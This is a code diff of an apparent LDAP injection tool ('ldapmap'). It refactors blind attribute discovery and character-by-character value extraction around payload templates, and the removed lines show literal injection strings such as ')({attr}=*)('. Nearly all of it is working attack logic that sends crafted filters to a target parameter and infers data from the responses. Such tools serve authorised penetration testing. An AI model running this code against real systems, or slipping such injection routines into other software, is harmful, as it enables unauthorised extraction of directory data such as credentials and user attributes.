@@ -3,6 +3,7 @@ import sys
 import requests
 
 from ldapmap_constants import (
+    ATTRIBUTE_TEST_TEMPLATES,
     CHARSET,
     COMMON_ATTRIBUTES,
     DETECTION_PAYLOADS,
@@ -11,6 +12,69 @@ from ldapmap_constants import (
 )
 from ldapmap_http import send_request
 from ldapmap_payloads import build_payload_data
+
+
+def _iter_attribute_payloads(attribute: str, value: str) -> tuple[str, ...]:
+    """Return candidate payloads for an attribute/value probe."""
+    return tuple(
+        template.format(attr=attribute, value=value)
+        for template in ATTRIBUTE_TEST_TEMPLATES
+    )
+
+
+def _classify_attribute_payload(
+    session: requests.Session,
+    url: str,
+    base_data: dict,
+    param: str,
+    payload: str,
+    status_true_set: set[int],
+    true_length: int,
+    verbose: bool,
+    use_json: bool,
+    false_statuses: set[int] | None,
+) -> tuple[str, requests.Response | None]:
+    """Send one payload and return (classification, response)."""
+    data = build_payload_data(base_data, param, payload, use_json)
+    resp = send_request(session, url, data, verbose, use_json)
+    classification = classify_response(resp, status_true_set, true_length, false_statuses)
+    return classification, resp
+
+
+def _discover_working_template_for_attribute(
+    session: requests.Session,
+    url: str,
+    base_data: dict,
+    param: str,
+    attribute: str,
+    status_true_set: set[int],
+    true_length: int,
+    verbose: bool,
+    use_json: bool,
+    false_statuses: set[int] | None,
+) -> str | None:
+    """
+    Pick a payload template that yields TRUE for the given *attribute*.
+
+    The returned template string is one of ATTRIBUTE_TEST_TEMPLATES.
+    """
+    for template in ATTRIBUTE_TEST_TEMPLATES:
+        payload = template.format(attr=attribute, value="")
+        classification, _ = _classify_attribute_payload(
+            session,
+            url,
+            base_data,
+            param,
+            payload,
+            status_true_set,
+            true_length,
+            verbose,
+            use_json,
+            false_statuses,
+        )
+        if classification == "true":
+            return template
+    return None
 
 
 def get_baseline(
@@ -250,20 +314,24 @@ def discover_attributes(
     found: list[str] = []
 
     for attr in attributes:
-        payload_variants = (
-            f")({attr}=*)(",
-            f")({attr}=*)({attr}=",
-            f")({attr}=*)",
-        )
         status_true_set = true_statuses if true_statuses is not None else {true_status}
         attr_found = False
         saw_false = False
-        for payload in payload_variants:
-            data = build_payload_data(base_data, param, payload, use_json)
-            resp = send_request(session, url, data, verbose, use_json)
+        for payload in _iter_attribute_payloads(attr, ""):
+            classification, resp = _classify_attribute_payload(
+                session,
+                url,
+                base_data,
+                param,
+                payload,
+                status_true_set,
+                true_length,
+                verbose,
+                use_json,
+                false_statuses,
+            )
             if resp is None:
                 continue
-            classification = classify_response(resp, status_true_set, true_length, false_statuses)
             if classification == "true":
                 print(f"  [+] Attribute present: {attr}")
                 found.append(attr)
@@ -312,18 +380,44 @@ def extract_attribute(
     print(f"\n[*] --- Extraction Phase: {attribute} ---")
     extracted = ""
     print(f"  [*] Extracting {attribute}: ", end="", flush=True)
+    status_true_set = true_statuses if true_statuses is not None else {true_status}
+    working_template = _discover_working_template_for_attribute(
+        session,
+        url,
+        base_data,
+        param,
+        attribute,
+        status_true_set,
+        true_length,
+        verbose,
+        use_json,
+        false_statuses,
+    )
+    if working_template is None:
+        print(
+            f"\n  [!] Could not determine a working injection template for attribute '{attribute}'.",
+            file=sys.stderr,
+        )
+        return ""
 
     while True:
         found_char = False
         for char in CHARSET:
-            # Build blind payload: )(attr=<prefix><char>*)
-            payload = f")({attribute}={extracted}{char}*)"
-            data = build_payload_data(base_data, param, payload, use_json)
-            resp = send_request(session, url, data, verbose, use_json)
+            payload = working_template.format(attr=attribute, value=f"{extracted}{char}")
+            classification, resp = _classify_attribute_payload(
+                session,
+                url,
+                base_data,
+                param,
+                payload,
+                status_true_set,
+                true_length,
+                verbose,
+                use_json,
+                false_statuses,
+            )
             if resp is None:
                 continue
-            status_true_set = true_statuses if true_statuses is not None else {true_status}
-            classification = classify_response(resp, status_true_set, true_length, false_statuses)
             if classification == "true":
                 extracted += char
                 print(char, end="", flush=True)
